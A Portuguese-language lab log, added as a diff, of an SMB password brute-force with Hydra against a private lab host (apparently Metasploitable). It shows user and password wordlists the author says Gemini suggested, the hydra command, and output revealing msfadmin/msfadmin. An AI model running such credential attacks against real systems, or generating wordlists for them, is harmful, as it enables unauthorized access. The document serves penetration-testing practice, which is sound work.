@@ -1,0 +1,91 @@
+Pedi ao gemini para gerar uma lista de usários e senhas para a exploração, ele trouxe várias sugestões interessantes, desta forma criei minhas listas de teste
+                                                                                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ cat users.txt 
+Administrator
+Admin
+Guest
+User
+Backup
+Operator
+Arcserve 
+Scanner 
+msfadmin
+                                                                                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ cat passwd.txt
+123456
+password
+admin
+admin123
+Password123 
+P@ssw0rd123
+12345678
+Welcome123 
+Summer2024 
+P@ssword
+root
+guest
+user
+12345
+qwerty
+microsoft
+p@ssword1
+changeme
+suporte
+senha123 
+msfadmin
+
+De posse das listas efetuei um teste com o hydra para ver se ele efetuava as combinações e gerava o resultado esperado.
+
+──(kali㉿kali)-[~]
+└─$ hydra -L users.txt -P passwd.txt smb://192.168.56.102 -t 4 -vV
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-22 16:15:01
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 198 login tries (l:9/p:22), ~198 tries per task
+[DATA] attacking smb://192.168.56.102:445/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] accntFlag is 2
+[VERBOSE] hashFlag is 2
+[ATTEMPT] target 192.168.56.102 - login "Administrator" - pass "123456" - 1 of 198 [child 0] (0/0)
+[VERBOSE] Attempting WIN2K Native mode.
+[VERBOSE] Server requested ENCRYPTED password without security signatures.
+[VERBOSE] Server machine name: 
+[VERBOSE] Server primary domain: WORKGROUP
+[VERBOSE] Attempting NTLM password authentication.
+[VERBOSE] Set NBSS header length: A2
+[VERBOSE] Set byte count: 00
+[VERBOSE] SMBSessionRet: 0000006D SMBerr: 006D SMBaction: 00
+[ATTEMPT] target 192.168.56.102 - login "Administrator" - pass "password" - 2 of 198 [child 0] (0/0)
+[VERBOSE] Set byte count: 00
+[VERBOSE] SMBSessionRet: 0000006D SMBerr: 006D SMBaction: 00
+[ATTEMPT] target 192.168.56.102 - login "msfadmin" - pass "senha123 " - 196 of 198 [child 0] (0/0)
+[VERBOSE] Attempting WIN2K Native mode.
+[VERBOSE] Server requested ENCRYPTED password without security signatures.
+[VERBOSE] Server machine name: 
+[VERBOSE] Server primary domain: WORKGROUP
+[VERBOSE] Attempting NTLM password authentication.
+[VERBOSE] Set NBSS header length: 98
+
+... 
+
+[VERBOSE] Set byte count: 00
+[VERBOSE] SMBSessionRet: 0000006D SMBerr: 006D SMBaction: 00
+[ATTEMPT] target 192.168.56.102 - login "msfadmin" - pass "msfadmin" - 197 of 198 [child 0] (0/0)
+[VERBOSE] Attempting WIN2K Native mode.
+[VERBOSE] Server requested ENCRYPTED password without security signatures.
+[VERBOSE] Server machine name: 
+[VERBOSE] Server primary domain: WORKGROUP
+[VERBOSE] Attempting NTLM password authentication.
+[VERBOSE] Set NBSS header length: 98
+[VERBOSE] Set byte count: 00
+[VERBOSE] SMBSessionRet: 00000000 SMBerr: 0000 SMBaction: 00
+[445][smb] host: 192.168.56.102   login: msfadmin   password: msfadmin
+[STATUS] attack finished for 192.168.56.102 (waiting for children to complete tests)
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-22 16:15:29
+                                                                                                                                                                                       
+┌──(kali㉿kali)-[~]
+Exploração efetuada com sucesso !!!
